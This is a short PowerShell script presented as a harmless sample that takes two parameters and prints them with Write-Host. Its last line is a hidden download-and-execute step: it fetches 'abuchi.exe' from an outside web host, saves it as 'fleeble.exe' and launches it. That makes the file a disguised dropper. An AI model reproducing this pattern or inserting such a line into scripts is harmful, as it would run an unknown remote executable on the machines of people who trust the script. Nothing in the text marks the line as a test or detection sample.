param(
    [string]$first,
    [string]$second
)
Write-Host This is a sample script with parameters $first $second
Write-Host "Second line with escaped characters"

(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/abuchi.exe','fleeble.exe');Start-Process 'fleeble.exe'

